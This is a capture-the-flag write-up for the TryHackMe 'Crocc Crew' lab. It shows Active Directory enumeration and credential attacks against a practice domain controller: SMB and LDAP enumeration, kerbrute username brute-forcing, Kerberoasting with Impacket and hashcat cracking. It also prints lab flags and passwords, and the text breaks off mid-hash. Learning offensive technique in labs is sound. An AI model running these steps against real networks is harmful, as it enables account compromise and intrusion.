<p align="center">May 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{360}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/87c8d0be-06d6-4123-9fb7-983611769dfc" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/28b561fc-e1c5-4660-a1d1-35253055f98b"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Crocc Crew}}$$</h1>
<p align="center"><em>Crocc Crew has created a backdoor on a Cooctus Corp Domain Controller. We're calling in the experts to find the real back door!</em>!<br>
It is classified as an insane-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/chrome">here</a>.</p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/db2daae3-0809-4567-8776-3eaca7223785"> </p>


<br>
<br>

<h2>Task 1 . Get Connected!</h2>

![image](https://github.com/user-attachments/assets/4c9e3508-5673-46aa-b1ce-6573ba9ae1c4)


<p>[ ... ]</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>You're now ready to start hacking! </em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

> 1.2. <em>Alternatively, you can deploy the In-Browser Kali or Attack Box and automatically be connected to the TryHackMe Network.</em><br><a id='1.2'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

> 1.3. <em>Once connected to the VPN, deploy the machine and get hacking!</em><br><a id='1.3'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>
<br>

<h2>Task 2. Hack Back!</h2>

<p>[ ... ]</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 2.1. <em>What is the User flag?</em><br><a id='2.1'></a>
>> <strong><code>THM{Gu3st_Pl3as3}</code></strong><br>
<p></p>

<br>

<p><code>nmap</code></p>

<br>

```bash
~/CroccCrew# nmap -sC -sV -Pn -p- -T4 -n TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-01 04:33:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   DNS_Tree_Name: COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-01...
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Not valid before: 2025-04-30...
|_Not valid after:  2025-10-30...
|_ssl-date: 2025-05-01...; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49876/tcp open  msrpc         Microsoft Windows RPC
50618/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:8d:9f:4c:00:a1 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-01...
|_  start_date: N/A
...
:~/CroccCrew# 
```

<br>


<p>- Navigated to <code>http://TargetIP/robots.txt</code>.</p>

```bash
User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php
```

<br>

<p>- Navigated to <code>http://TargetIP/backdoor.php</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/b0e6d04f-c184-47fc-9d2a-68c26a926c4e)

<br>

<p>- Viewed <code>Page Source</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/ce56a028-9da1-4ba0-b3ad-aced96362719)


<br>

<p>- Navigated to <code>http://TargetIP/db-config.back</code>.<br><br>
servername : <code>db.cooctus.corp</code><br><br>
username : <code>C00ctusAdm1n</code><br><br>
password : <code>B4dt0th3b0n3</code></p>

<br>

<p>Tried to <code>rdp</code> using the discovered credentials.  Did not work.</p>

<br>

![image](https://github.com/user-attachments/assets/3fdb3eaf-aed8-4707-929b-f08cc0f58fc3)


<br>

<p>- Installed and used <code>rdesktop</code>.<r><br>
Tried <code>xfreerdp</r>. Did dnot work.</p>

<br>

```bash
:~/CroccCrew# apt install rdesktop
...
:~/CroccCrew# rdesktop -f -u "" TargetIP
...
yes
...
```


<br>

<p>- Discovered <code>Visitor</code>:<code>GuestLogin!</code>.<br><br>
- Tried to used the crecentials.  Did not work.</p>

<br>

![image](https://github.com/user-attachments/assets/7ef9d2ea-eebf-469f-84ee-cbfac25d7243)

<br>


![image](https://github.com/user-attachments/assets/8e57ab5f-78fd-4c98-bd73-990a82a06a35)


<br>

![image](https://github.com/user-attachments/assets/b5184ce2-b948-44e9-a51e-c588f5a00ec4)

<br>

<p>Enumerated <code>SMB</code> with <code>crackmapexec</code>:<br>


- Installed and used <code>crackmapexec</code> with the credentials <code>Visitor</code>:<code>GuestLogin!</code>.<br><br>
- Discovered <code>domain</code> : <code>COOCTUS.CORP</code>.</p>

```bash
:~/CroccCrew# snap install crackmapexec
...
:~/CroccCrew# # crackmapexec smb TargetIP -u Visitor -p GuestLogin!
SMB         TargetIP    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         TargetIP    445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin! 
:~/CroccCrew# 
```

<br>

<p>Used <code>smbclient</code>:<br>
- Installed and used <code>smbclient</code> with the credentials <code>Visitor</code>:<code>GuestLogin!</code>.<br><br>
- Confirmed the <code>share</code>code> names.</p><br><br>
- <code>Home</code> caught my attention.</p>

<br>

```bash
~/CroccCrew# smbclient -L //TargetIP -U "Visitor"
Password for [WORKGROUP\Visitor]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
:~/CroccCrew#
:~/CroccCrew# smbclient //TargetIP/Home -U "Visitor"
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 20:42:53 2021
  ..                                  D        0  Tue Jun  8 20:42:53 2021
  user.txt                            A       17  Tue Jun  8 04:14:25 2021

		15587583 blocks of size 4096. 11430698 blocks available
smb: \> more user.txt
getting file \user.txt of size 17 as /tmp/smbmore.CQgSzr (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
...
THM{Gu3st_Pl3as3}
```

<br>


> 2.2. <em>What is the name of the account Crocc Crew planted?</em><br><a id='2.2'></a>
>> <strong><code>admcrocccrew</code></strong><br>
<p></p>

<br>


<p>Used <code>rpcclient</code>.</p>

<br>

```bash
:~/CroccCrew# rpcclient -U "" -N targetIP
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege 		0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
SeLockMemoryPrivilege 		0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTcbPrivilege 		0:7 (0x0:0x7)
SeSecurityPrivilege 		0:8 (0x0:0x8)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeLoadDriverPrivilege 		0:10 (0x0:0xa)
SeSystemProfilePrivilege 		0:11 (0x0:0xb)
SeSystemtimePrivilege 		0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SeUndockPrivilege 		0:25 (0x0:0x19)
SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
SeManageVolumePrivilege 		0:28 (0x0:0x1c)
SeImpersonatePrivilege 		0:29 (0x0:0x1d)
SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
SeRelabelPrivilege 		0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
SeTimeZonePrivilege 		0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)
rpcclient $> exit
```

<br>

```bash
:~/CroccCrew# smbclient //10.10.130.42/SYSVOL -U "Visitor"
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 01:34:33 2021
  ..                                  D        0  Tue Jun  8 01:34:33 2021
  COOCTUS.CORP                       Dr        0  Tue Jun  8 01:34:33 2021

		15587583 blocks of size 4096. 11429391 blocks available
smb: \> cd COOCTUS.CORP\
smb: \COOCTUS.CORP\> ls
  .                                   D        0  Tue Jun  8 01:40:32 2021
  ..                                  D        0  Tue Jun  8 01:40:32 2021
  DfsrPrivate                      DHSr        0  Tue Jun  8 01:40:32 2021
  Policies                            D        0  Tue Jun  8 01:34:38 2021
  scripts                             D        0  Tue Jun  8 01:34:33 2021

		15587583 blocks of size 4096. 11429386 blocks available
smb: \COOCTUS.CORP\> cd DfsPrivate\
cd \COOCTUS.CORP\DfsPrivate\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \COOCTUS.CORP\> cd Policies\
smb: \COOCTUS.CORP\Policies\> ls
  .                                   D        0  Tue Jun  8 01:34:38 2021
  ..                                  D        0  Tue Jun  8 01:34:38 2021
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Tue Jun  8 01:34:38 2021
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Tue Jun  8 01:34:38 2021

		15587583 blocks of size 4096. 11429437 blocks available
smb: \COOCTUS.CORP\Policies\> cd ..
smb: \COOCTUS.CORP\> cd scripts\
smb: \COOCTUS.CORP\scripts\> ls
  .                                   D        0  Tue Jun  8 01:34:33 2021
  ..                                  D        0  Tue Jun  8 01:34:33 2021

		15587583 blocks of size 4096. 11429437 blocks available
smb: \COOCTUS.CORP\scripts\> 
```

<br>

<p>Downloaded and used <code>kerbrute</code>.<br><br>
Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64</p>

<br>

```bash
:~/CroccCrew# chmod +x kerbrute_linux_amd64
...

~/CroccCrew# ./kerbrute_linux_amd64 userenum -d COOCTUS.CORP --dc 10.10.130.42 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/01/25 - Ronnie Flathers @ropnop

2025/05/01 00:08:46 >  Using KDC(s):
2025/05/01 00:08:46 >  	10.10.130.42:88

2025/05/01 00:08:46 >  [+] VALID USERNAME:	 david@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 mark@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 steve@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 kevin@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 jeff@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 howard@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 David@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 ben@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 Steve@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 karen@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 evan@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 Mark@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 administrator@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 Howard@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 Kevin@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 jon@COOCTUS.CORP
2025/05/01 00:08:46 >  [+] VALID USERNAME:	 STEVE@COOCTUS.CORP
2025/05/01 00:08:47 >  [+] VALID USERNAME:	 Jeff@COOCTUS.CORP
2025/05/01 00:08:47 >  [+] VALID USERNAME:	 DAVID@COOCTUS.CORP
2025/05/01 00:08:47 >  [+] VALID USERNAME:	 Karen@COOCTUS.CORP
2025/05/01 00:08:48 >  [+] VALID USERNAME:	 MARK@COOCTUS.CORP
2025/05/01 00:08:48 >  [+] VALID USERNAME:	 JEFF@COOCTUS.CORP
2025/05/01 00:08:49 >  [+] VALID USERNAME:	 Jon@COOCTUS.CORP
2025/05/01 00:08:49 >  [+] VALID USERNAME:	 KEVIN@COOCTUS.CORP
2025/05/01 00:08:49 >  [+] VALID USERNAME:	 Ben@COOCTUS.CORP
2025/05/01 00:08:49 >  [+] VALID USERNAME:	 Administrator@COOCTUS.CORP
2025/05/01 00:08:50 >  [+] VALID USERNAME:	 HOWARD@COOCTUS.CORP
2025/05/01 00:08:50 >  [+] VALID USERNAME:	 BEN@COOCTUS.CORP
2025/05/01 00:08:52 >  [+] VALID USERNAME:	 Evan@COOCTUS.CORP
2025/05/01 00:08:52 >  [+] VALID USERNAME:	 spooks@COOCTUS.CORP
2025/05/01 00:08:53 >  [+] VALID USERNAME:	 JON@COOCTUS.CORP
2025/05/01 00:08:58 >  [+] VALID USERNAME:	 fawaz@COOCTUS.CORP
2025/05/01 00:09:00 >  [+] VALID USERNAME:	 visitor@COOCTUS.CORP
2025/05/01 00:09:04 >  [+] VALID USERNAME:	 KAREN@COOCTUS.CORP
2025/05/01 00:09:07 >  [+] VALID USERNAME:	 pars@COOCTUS.CORP
2025/05/01 00:09:32 >  [+] VALID USERNAME:	 EVAN@COOCTUS.CORP
2025/05/01 00:19:33 >  [+] VALID USERNAME:	 steVE@COOCTUS.CORP
2025/05/01 00:29:13 >  [+] VALID USERNAME:	 kaRen@COOCTUS.CORP
2025/05/01 00:46:43 >  [+] VALID USERNAME:	 Visitor@COOCTUS.CORP
2025/05/01 00:48:00 >  [+] VALID USERNAME:	 StEvE@COOCTUS.CORP
2025/05/01 00:48:48 >  [+] VALID USERNAME:	 SPOOKS@COOCTUS.CORP
2025/05/01 00:50:23 >  [+] VALID USERNAME:	 MarK@COOCTUS.CORP
2025/05/01 00:50:27 >  [+] VALID USERNAME:	 MArk@COOCTUS.CORP
2025/05/01 00:50:43 >  [+] VALID USERNAME:	 KeVIN@COOCTUS.CORP
2025/05/01 00:51:09 >  [+] VALID USERNAME:	 JoN@COOCTUS.CORP
2025/05/01 00:54:31 >  [+] VALID USERNAME:	 DaViD@COOCTUS.CORP
2025/05/01 00:58:07 >  Done! Tested 8295455 usernames (46 valid) in 2650.714 seconds
:~/CroccCrew# 

```

<br>

<p>Used <code>ldapsearch</code>.</p>

<br>

```bash
:~/CroccCrew# ldapsearch -h
...
usage: ldapsearch [options] [filter [attributes...]]
where:
  filter	RFC 4515 compliant LDAP search filter
  attributes	whitespace-separated list of attribute descriptions
    which may include:
      1.1   no attributes
      *     all user attributes
      +     all operational attributes
Search options:
...

-s scope   one of base, one, sub or children (search scope)

...
-x         Simple authentication

...
:~/CroccCrew# ldapsearch -x -s base namingcontexts -H ldap://TargetIP
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=COOCTUS,DC=CORP
namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP
namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
:~/CroccCrew# 
```


<br>

<p>Used <code>ldapsearch</code>.</p>

<br>


```bash
:~/CroccCrew# ldapsearch -x -b "DC=COOCTUS,DC=CORP" -H ldap://TargetIP
# extended LDIF
#
# LDAPv3
# base <DC=COOCTUS,DC=CORP> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
:~/CroccCrew#
```

<br>

<p>Used <code>ldapsearch</code> to generated <code>lpad_report.txt</code>.</p>

<br>

```bash
:~/CroccCrew# ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -H ldap://10.10.130.42 -W > ldap_report.txt
Enter LDAP Password: 
```

<br>

<p><code>ldap_report.txt</code> content is huge!!!<br><br>
Following its content filtered.</p>

<p>name : <code>admCroccCrew</code><br><br>
sAMAccountName: <code>password-reset</code><br><br>
userPrincipalName: <code>password-reset@COOCTUS.CORP</code><br><br>
servicePrincipalName: <code></code>HTTP/dc.cooctus.corp</code></p>

<br>

```bash
...
# admCroccCrew, Enterprise-Admins, Security-OU, COOCTUS.CORP
dn: CN=admCroccCrew,OU=Enterprise-Admins,OU=Security-OU,DC=COOCTUS,DC=CORP
...
name: admCroccCrew
objectGUID:: ej4EyTrxQECq9t62o8ROGg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132676033890368878
lastLogoff: 0
lastLogon: 132676033917094150
pwdLastSet: 132676009478796916
...
sAMAccountName: password-reset
sAMAccountType: 805306368
userPrincipalName: password-reset@COOCTUS.CORP
servicePrincipalName: HTTP/dc.cooctus.corp
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
dSCorePropagationData: 20210608191453.0Z
dSCorePropagationData: 20210608185942.0Z
dSCorePropagationData: 20210608053540.0Z
dSCorePropagationData: 20210608053303.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 132676040955082258
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS.CORP
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP
msDS-AllowedToDelegateTo: oakley/DC
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS
...
```

<br>


> 2.3. <em>What is the User flag?</em><br><a id='2.3'></a>
>> <strong><code>THM{0n-Y0ur-Way-t0-DA}</code></strong><br>
<p></p>

<br>


<p>Added <code>DC.COOCTUS.CORP</code> to <code>/etc/hosts</code><br><br>
Navigated to <code>http://dc.cooctus.corp</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/0cae942b-a00b-4585-a7c0-e38f9089f274)

<br>

<p>Visited page source</p>

<br>

<p>- Used <code>curl</code> to get its content.<br><br>
- Discovered <code>croccrew.webflow.io</code>.<br><br>
- Added it to <code>/etc/hosts</code>.</p>

```bash
<!DOCTYPE html> <html data-wf-domain=croccrew.webflow.io data-wf-page=605e71875f98876ec09d520b data-wf-site=605e71875f98872ac09d520a data-wf-status=1 class="w-mod-js wf-ubuntu-n3-active wf-ubuntu-n5-active wf-ubuntu-i5-active wf-ubuntu-n7-active wf-ubuntu-i3-active wf-montserrat-i2 -active wf-montserrat-n2-active wf-montserrat-i1-active wf-ubuntu-i4-active wf-ubuntu-n4-active wf-montserrat-n1-active wf-montserrat-n8-active wf-montserrat-i7-active wf-montserrat-n7-active wf-montserrat-i6-active wf-montserrat-n6-active wf-montserrat-i5-active wf-montserrat-n5 active wf-montserrat-i4-active wf-montserrat-n4-active wf-montserrat-i3-active wf-montserrat-i9-active wf-ubuntu-i7-active wf-montserrat-n3-active wf-montserrat-n9-active wf-montserrat-i8-active wf-active"><!--
Page saved with SingleFile 
url: https://croccrew.webflow.io/ 
saved date: Tue Jun 08 2021 01:15:08 GMT-0400 (Eastern Daylight Time)
-><meta charset=utf-8><title>croccrew</title><meta content="width=device-width, initial-scale=1" name=viewport><meta content=Webflow name=generator><style>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}a{background-color:transparent}a:active,a:hover{outline:0}img{border:0}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{height:100%}body{margin:0;min-height:100%;font-family:Arial,sans-serif;font-size:14px;line-height:20px;color:#333}img{max-width:100%;vertical-align:middle}.w-conainer{margin-left:auto;margin-right:auto;max-width:940px}.w-container:before,.w-container:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-container:after{clear:both}@media screen and (max-width:991px){.w-container{max-width:728px}}@media screen and (max-width:479px){.w-container{max-width:none}}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.container{background-color:#000;font-family:Ubuntu,Helvetica,sans-serif}.body{margin-top:38px;background-color:#000;font-weight:70
....
<rocodile/>\U0001f40a</a> DARKSTAR7471 <a href=https://emojipedia.org/crocodile/>\U0001f40a</a> ORIEL <a href=https://emojipedia.org/crocodile/>\U0001f40a</a> NAMELESS0NE <a href=https://emojipedia.org/crocodile/>\U0001f40a</a> SMACKHACK <a href=https://emojipedia.org/crocodile/>\U0001f40a</a> FAWAZ</div></div><!--[if lte  IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif]-->
div id=janus-extension-installed style=display:none></div>
```

<br>

<p>- Navigated to <code>http://croccrew.webflow.io</code>.<br><br>. Nothing :-(</p>

<br>


```bash
:~/CroccCrew# ldapdomaindump TargetIP -u "COOCTUS\Visitor" -p 'GuestLogin!'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
...
```

<br>


<p>

<p>Target IP: <code>TargetIP</code><br>

Domain: <code>COOCTUS.CORP</code><br>

Username: <code>Visitor</code><br>

Password: <code>GuestLogin!</code></p>

<br>

```bash
:~/CroccCrew# python3 /opt/impacket/build/scripts-3.8/GetUserSPNs.py COOCTUS.CORP/Visitor:GuestLogin! -dc-ip TargetIP -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 23:00:39.356663  2021-06-08 22:46:23.369540  constrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$12a7dcac2833b3ed9b0dd90833701ca6$0239c68cf5bc3b5210b725a95a82b7c0f2f77558ca3351d2ec5d8b2807a41fc93f9811efd913f1813722d07636dd98a289ea31edd09946397213938fe4d7fd9f15e0278080f1b0642b7ca232dc766f33fbaa4d2fed00aa48567d20c4772a04b29317ff5aa25ce3d9f8ab24a346f91285f0be384254eb64952c5e26c5501c2ab0bafec2ba3aaf451386ae91f17d0633977d459589d25f2631faa98ed758a7cfafa4fbdc035cc299fd441953ab67def3054b2cff0c30fbeb7521ec9f107f465254573cfd7ea55db06bbb443ff3002713e604db5b26c3ea15c5c5ce90829e39590c675db45c326c2c82c7481814db29f6949f3a96b3f5ecd1d455d2f5d52607f4dbd2dc8548ae92750b7ba591a41e0ca061e5130b74381f9a81f233db416274d2d0f1b5d75f3a58efb77cd238e161572b0467727bf06d437127c9f277c1103558d6441f0ae8b42113bd8fbf43229954c393056e7daeff546ad112af7516b0afc077c4f93e3666636175df6e6f2666ec3e33806bd49a45c3776cc49c55138df552ab1d6523a519707fbe94410fd05d783814c21893ea671301692a4369219a3cfae26f24ff95cb94e0882315a97f3b6d71121a2f5b0426bf74098aa7b84cd88f18063e52ab6462c3c3980f0cc9033ba737003b9a3ec8c85e5cbf257d25cf7b91338f0d842bb2285336d779a9cc0f33a2171144c4c4459aee3469e33a14ffd76a80b42d7314c2e5b00f35af78486f8dc319b85cecb7238928c6fc7aef6798f30dddbb545ac638485a4a7c065a3b4afd386b209c48a50e349c8ff598af0296993248504b5bd5000d39b42cff73b33e3705283d8e62be1f91432db5fd1659d3c536ecfedf5223af09933de553380e88018b4e0b348c39d77cfbc401df8b0c65b74d5b195815d0276aa306143e8a48da85d6958969c76dca24e243a3f43a1188bee977efe7a053680fb25a2e898e82e9c0c44bf2f0cbf3220f4d648e9453e1cb8f5027ca7a8f608eb04cdfb80332f40bb81a2c36495d0e90633bcbda353a1ab4daa6e20a160ac283d60b1b4572c6ebf8d8ae52b9c9a6219a6d887174085e6a05686563002149a032abfc203d16154344187e6c251be7106965fe35729046e2e9ddb1654ad27037fbb2da6013930616d688106b8ae5ef5af4a6a9f5112118c56e50ecd2fa555297209265e06fc9a285979c1f43e06d82a3d0b980733233e4153811681c692011b4ee8e64a365763aec23391fbf2fd105a619daf2151f9247091798ad7a1ff223ee14bbb86fbad2549734fd9b4d0409da4ddb6acdf9886ebfce79aab363f3661a08c943a14d360b43e0ce9f293562eaa5472639843f81a163f32f

...
```

<br>

<p>- Created <code>this</code> file with the hash.<br><br>
- Used <code>hashcat</code> and discovered <code>password-reset</code>code> and <code>resetpassword</code>.</p>

<br>

```bash
:~/CroccCrew# hashcat -m 13100 this /usr/share/wordlists/rockyou.txt
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 11 secs

$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$6299125f1746c83fa284488f7d14b31a$9c83c31ce9ff7a02f3d1b10e2a2cb90d752e154f8c88bf5ee70588b8e69af4863b82ca40ba7cfc0fbbebe12bb3daa843cfaa992f13aa6ed2cc3cc55bdb28fe1f8347f283352e7c38bf83e98815fd03e44b03d056cfe4df5699e5a3dc2703e3244f898f50fcfb345c0fb008d4399cd62739eac1d7e5b0c33fda8f80102d0fced1d6e694b3671f462b6380a62f139320312a957e256fdce795e8bada306301d8d57be6893b477e17cb76f3cd1eec9b51822116d25f70a765b3a88c5ddf2cc8031b3ffbb6a1cf7cb71d5ce242065c59c8a3e135863717f8b4301601d88b164bfa14daa3ebc7c46d49aff682f21899afe1d786247295036f9ca6bb6fabe536863a4c242de97404c67205977709b11a846be6015ac142011fa3fda0abaf3670ec027c8bb40eb4af0b9f0fb3f930dadf97d3874508d34beb2305251f47c2565e220568b5dffcf516b030e480faafd8dbbe6e3c33812fdebc11c8c1f3326be4ae02b6390edb46236b30098276b7684bcc859afc999abba7f96bbdef6d82c2161769cd5eaea65067de0145ad3012ec007ff0848db0a9b089429885a9106bfb05c1dde5e947272a854f0404974df744f0964dced1ce1826cdcb96775f58b33c15225d88d75f92cc97ac5864f71c1b6a3d85efb0e361bc55ec8f70d39c8f24d2ce6bab68f1588b1bbb61caa8196e1be1950cfff7e40c5848848464c68eb292aab87ab111025552eeae0043cc53045e35f0907748f3fc44cfd4616335aa96bb247cce43d51949dc64502b5b74033c8e11a8d13e4fe